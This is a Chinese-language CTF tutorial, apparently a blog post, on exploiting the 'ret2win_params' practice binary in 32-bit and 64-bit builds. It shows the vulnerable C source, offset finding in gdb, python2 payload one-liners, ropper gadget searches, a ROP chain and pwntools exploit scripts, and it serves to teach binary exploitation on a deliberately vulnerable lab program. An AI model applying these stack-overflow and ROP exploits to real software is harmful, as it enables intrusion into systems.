# 简介
“pwn"这个词的源起以及它被广泛地普遍使用的原因，源自于魔兽争霸某段讯息上设计师打字时拼错而造成的，原先的字词应该是"own"这个字，因为 ‘p’ 与 ‘o’ 在标准英文键盘上的位置是相邻的，PWN 也是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似"砰”，对黑客而言，这就是成功实施黑客攻击的声音，而在ctf比赛里，pwn是对二进制漏洞的利用


# 32位程序
下载这个github库，进入04文件夹
```
https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101
```
## 获取文件信息

进入32位程序文件夹

![在这里插入图片描述](https://img-blog.csdnimg.cn/e74f825c1bc443ea93f4fe7fc27c4519.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/ee6196bae5a4498caea7ffcca7e4bf8f.png)

使用checksec工具可以查看程序更详细的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/2a699ddda49248bfb3e909e7d9545e53.png)

可以看到，这个程序没有开启任何防护
从上到下依次是
```
32位程序
部分RELRO，基本上所有程序都默认的有这个
没有开启栈保护
未启用数据执行
没有pie，意思是程序的内存空间不会被随机化
有读，写，和执行的段，意思是我们可以在程序里写入shellcode
```

然后运行程序，输入一大堆字符串测试一下



![在这里插入图片描述](https://img-blog.csdnimg.cn/9ed57640762d432eb870cb782d1fbeb6.png)

程序报错退出了，报错的信息是分段错误，可能造成了缓冲区溢出
## 分析程序源代码
打开程序源代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/2272fbdc71684029bd7988ee25ed7a05.png)

```
#include <stdio.h>

void hacked(int first, int second)     //自定义的hacked函数，我们需要让程序执行这个函数才算破解程序
{
    if (first == 0xdeadbeef && second == 0xc0debabe){    //需要同时满足first = 0xdeadbeef和second = 0xc0debabe
        printf("This function is TOP SECRET! How did you get in here?! :O\n");   //破解程序
    }else{
        printf("Unauthorised access to secret function detected, authorities have been alerted!!\n");   //破解失败
    }

    return;
}

void register_name()   //自定义register_name函数，是程序主要执行的地方
{
    char buffer[16];    //定义了一个变量，名为buffer，有16个字节的缓冲区

    printf("Name:\n");    //输出字符"Name:
    scanf("%s", buffer);   //获取我们输入的字符，并存入到buffer变量里
    printf("Hi there, %s\n", buffer);     //输出字符Hi there和我们输入的变量
}

int main()
{
    register_name();   //调用上面的register_name自定义函数

    return 0;
}
```
这道题和上一道题差不多，只不过需要满足一些其他的条件才行
## 静态调试
将题目用ghidra打开，在函数列表找到main函数

![](https://img-blog.csdnimg.cn/76c6490ee6dd4befb86427e5686623f9.png)
双击去到对应函数的地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/752dbe367f04479099c55f5afc6fefd1.png)

这里和程序源代码里的代码差不多


![在这里插入图片描述](https://img-blog.csdnimg.cn/909943d75fe74f2494f8ff144c2c51e6.png)

我们在函数列表点击hacked函数，可以看到这里对比的数有些不一样

![在这里插入图片描述](https://img-blog.csdnimg.cn/68528f857b394ba98f60d10f9614a614.png)


我们单击一个数后，汇编界面会显示对应的汇编代码

可以看到，这里对比的数值就和源代码里的一样了，要想知道原因的话可以去看我之前写的使用arm进行汇编语言编程的文章，在那里我很详细的介绍了原理

![在这里插入图片描述](https://img-blog.csdnimg.cn/9f7abff5116047058d1b9579f3e2d311.png)

## 动态调试
我们用gdb对程序进行动态调试

```
gdb ret2win_params
```
然后查看程序里调用的函数
```
info functions
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/9061e53db9e144b59eba9ca58ec13960.png)

输入命令cyclic就能获得测试用的字符串
```
cyclic 200
```
生成200个字符串，每四个字符的最后一个字符都不一样，用于测试覆盖程序的返回地址需要多少个字符

复制输出的字符，然后运行程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/060ab86adce7452eae89b31fee7f38fb.png)


可以看到，程序已经报错了，而且里面原本的参数全被我们输入的值给覆盖了，这里需要注意的是ret指令，ret是子程序的返回指令，原本他要返回main函数，结果被我们覆盖了，返回到了其他不存在的地址，于是程序就报错了

EIP这个寄存器，他是程序的指针，指针就是寻找地址的，指到什么地址，就会运行该地址的参数，控制了这个指针，就能控制整个程序的运行

可以看到，eip寄存器里的值是haaa的十六进制，我们查一下haaa在刚刚生成的字符的第几个
```
cyclic -l haaa
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b37033ae9c814d9daf2d40d2beebc875.png)
说明我们要覆盖eip原本的返回地址并控制，就需要28个字符+想让程序跳转执行的地址

然后我们再次查看程序调用的函数地址
```
info functions
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/d2a968d903f54092a5749f1766270000.png)

hacked的函数地址是0x08049182，我们可以写一个小脚本来让程序跳转到这个地址

在x86架构里，读取地址是由低到高的，十六进制0x08049182就要从最后一个开始写，然后将输出的值存放到一个文件里


```
python2 -c "print 'A'*28+'\x82\x91\x04\x08'+'AAAA'+'BBBB'+'CCCC'+'DDDD'" > exp
```

回到gdb，在regustr_name函数最后的ret返回指令处下一个断点
```
b *0x0804922a
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/dc22471a6e874ecaa38fb6d56553ac6e.png)

这样可以让我们更方便的调试程序，然后运行程序，导入这个文件里的值

```
run < exp
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/0990745e0ef74cf39cf3e7682a8763f5.png)

可以看到，我们成功覆盖了原本的返回地址

按n进入下一步，一直到对比的地方

![](https://img-blog.csdnimg.cn/26756b963a4c48a3b6ad5ad37f321ee8.png)

我们查看一下这个寄存器里的值



![在这里插入图片描述](https://img-blog.csdnimg.cn/f1c41063e14240e7a9207141dfd7feee.png)

0x42转换成ascii码是大写的B，对比失败后程序会跳转，破解失败

![在这里插入图片描述](https://img-blog.csdnimg.cn/cabfc12079714adf972df22c37dab803.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/562292f5827047f9966e345d9c094b9b.png)

我们修改一下之前的exp
```
python2 -c "print 'A'*28+'\x82\x91\x04\x08'+'AAAA'+'\xef\xbe\xad\xde'+'CCCC'+'DDDD'" > exp
```
然后再次执行程序
```
run < exp
```
查看一下这个寄存器里的值
```
x $ebp + 8
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/cb6bb5f832ea432d8fbb08baa3c2cfa8.png)

可以看到，现在就和对比的值一样了，继续下一步，进行第二个对比

![在这里插入图片描述](https://img-blog.csdnimg.cn/e9cc3e7df22e4b5cad312ef8067b5d9c.png)

查看一下这个寄存器里的值
```
x $ebp + 0xc
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/68556ec9a4214845aef4918352c60468.png)

0x43转换成ascii码是大写的C，我们再改一下脚本
```
python2 -c "print 'A'*28+'\x82\x91\x04\x08'+'AAAA'+'\xef\xbe\xad\xde'+'\xbe\xba\xde\xc0'+'DDDD'" > exp
```


然后再次执行

![在这里插入图片描述](https://img-blog.csdnimg.cn/9e368410bf90488f845e4597686eca4b.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/a4b3f1724ff944dcb548fa53dfd27828.png)

成功破解程序，直接运行程序然后导入文件也可以破解

![在这里插入图片描述](https://img-blog.csdnimg.cn/bc9d7221c4e94fd29fdf709777ea855c.png)

## pwntools脚本
```
from pwn import *   //导入pwntools模块

io = process('./ret2win_params')    //运行程序
io.sendline(b'A' * 28 + p32(0x08049182) + 'AAAA' +p32(0xdeadbeef) + p32(0xc0debabe))   //程序运行后发送指定的字符串，格式为32位
print(io.recvall())   //接收输出
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/7d2f5d51fc6e4afe8c415163ed311585.png)

成功破解

# 64位程序
## 获取文件信息
去到64位程序文件夹下


![在这里插入图片描述](https://img-blog.csdnimg.cn/8e8a0e4acfd34d238359d6937616920d.png)


使用checksec工具可以查看程序更详细的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/a442f69a868b4476a2fd72f59782a13c.png)

可以看到这是一个64位的程序，其他的什么都没有变

我们看看源代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/0303ddd6ac914b6bb07cddef6850b919.png)

只是对比的字符变长了，其他也什么都没有变，静态调试也和之前的一模一样
## 动态调试
用gdb打开文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/18473c5d9a88477a99761f446fb8a86c.png)


然后我们反汇编hacked函数看看

![在这里插入图片描述](https://img-blog.csdnimg.cn/0432cca1928444cba69fbb77bdf004ee.png)


可以看到，很多地方都不一样了，我们打开32位程序对比看看


![在这里插入图片描述](https://img-blog.csdnimg.cn/c5632423e82d4fc5b6d212b4d0d61866.png)

测试一下缓冲区范围
```
cyclic 100
run
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/e0552d5c9c6a4543a41b852068f20ed3.png)

可以看到，我们的e开头的寄存器都变成r开头的了，这也是64位程序的一个特征，32位只有4个字节，而64位有8个字节

我们复制返回的地址去解码

![在这里插入图片描述](https://img-blog.csdnimg.cn/27ba9158ad764ed392d8015c7b29cd1a.png)
```
unhex 6161616861616167
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/119461d7fc6b4ae0b9e2d2e851a3666a.png)

注意，由于在x86架构里，读取地址是由低到高的，所以这里的字符串是gaaahaaa

我们只需要复制前四位即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/ff069c539eae471cb6002c1c949e9ac1.png)

说明我们要覆盖rip原本的返回地址并控制，就需要24个字符+想让程序跳转执行的地址

现在我们写一个小脚本，首先hacked函数的地址在
```
0x0000000000401142
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0f534347047c4896b3ee0f049090b611.png)

然后程序缓冲区的区间是24个字符

## 关于64位寄存器的知识点
如果不想看得云里雾里，我推荐去看看我写的使用arm进行汇编语言编程系列


64位程序将要对比的值存入rdi和rsi寄存器里，在这图中也可以看到相对应的操作

![在这里插入图片描述](https://img-blog.csdnimg.cn/72451b87129941e6ae2c0306aa153fc2.png)



![在这里插入图片描述](https://img-blog.csdnimg.cn/86d2fc7876e04a05a52ae6b7887082bc.png)

在64位寄存器中，有两个寄存器需要知道，rdi寄存器和rsi寄存器，rdi寄存器用于第一个参数传递，而rsi是第二个参数传递，我们要把对比的值放入这两个寄存器里，就需要参数传递，64位比32位要麻烦许多

## 构造ROP链
我们要找到这些特殊的寄存器就需要ropper这个工具，这个工具的用处就是寻找指定操作指令的地址
```
apt install ropper  //安装ropper  
ropper --file ret2win_params --search "pop rdi"  //从内存中弹出值到rdi寄存器中
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/9259b129b97c446ea9d77f8761ff2296.png)

这个地址是执行pop rdi操作的
```
0x000000000040124b
```


然后继续补全我们的脚本0xdeadbeefdeadbeef
```
python2 -c 'print "A" * 24 + "\x4b\x12\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde"'
//从内存中弹出并存放到rdi寄存器里的值就是我们需要对比的字符deadbeefdeadbeef
```

程序对比时还有一个参数，所以我们还需要找到pop rsi指令的地址


```
ropper --file ret2win_params --search "pop rsi"  //从内存中弹出值到rsi寄存器中
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/7ac47a26f8314232a4d430909df4bb7a.png)

但是由于这里还执行了其他的命令，pop r15，我们可以传入一些垃圾字符进去
```
0x0000000000401249
```

然后我们继续补全脚本，整个脚本的逻辑是这样的

垃圾字符 + pop_rdi的地址 + 我们第一个对比的值 + pop_rsi的地址 + 我们第二个对比的值 + 8个字符的垃圾数据 + hacked函数的地址

```
python2 -c 'print "A" * 24 + "\x4b\x12\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\x49\x12\x40\x00\x00\x00\x00\x00" + "\xbe\xba\xde\xc0\xbe\xba\xde\xc0" + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x42\x11\x40\x00\x00\x00\x00\x00"' > exp
```

现在脚本就完成了，这里hacked函数地址要在最后的原因是，如果我们放到第一个，程序跳转之后就不会执行我们后续的操作了，所以我们要将需要执行的操作都执行后，再跳转

我们脚本调用pop rdi之类的指令，从内存弹出的值都是我们写的值，因为程序原本的值都被我们覆盖了，他是按照顺序弹的


![在这里插入图片描述](https://img-blog.csdnimg.cn/4c16a15ecca3439b996895160e35b5f0.png)


我们要在程序主函数的最后的地址下一个断点，方便调试，然后我们执行程序，并导入文件里的数据

```
disassemble register_name
b *0x00000000004011d6
run < exp
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/9e653eaa4ae94bd48229d2ed497f38b8.png)

可以看到，程序在执行了我们指定的操作后，才跳转到hacked函数的地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/ef31cdb30a2d446ab403b0c437954d95.png)

rdi里存放的值就是之后要对比的值

继续执行

![在这里插入图片描述](https://img-blog.csdnimg.cn/24d5ca7ecaad44c489fd0ea0af30c109.png)


成功破解程序，我们直接执行程序，然后导入文件看看

![在这里插入图片描述](https://img-blog.csdnimg.cn/2f51c071a3cb4cfdab750ba9604f7bf3.png)

也是能成功破解的

## pwntools脚本
```
from pwn import *

io = process('./ret2win_params')
io.sendline(b"A" * 24 + b"\x4b\x12\x40\x00\x00\x00\x00\x00" + b"\xef\xbe\xad\xde\xef\xbe\xad\xde" + b"\x49\x12\x40\x00\x00\x00\x00\x00" + b"\xbe\xba\xde\xc0\xbe\xba\xde\xc0" + b"\x00\x00\x00\x00\x00\x00\x00\x00" + b"\x42\x11\x40\x00\x00\x00\x00\x00")

print(io.recvall())
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f6e7607db3044d239562168968995dd3.png)
成功破解程序
# 总结
有什么不会或者是错误的地方的可以私信我，看到必回
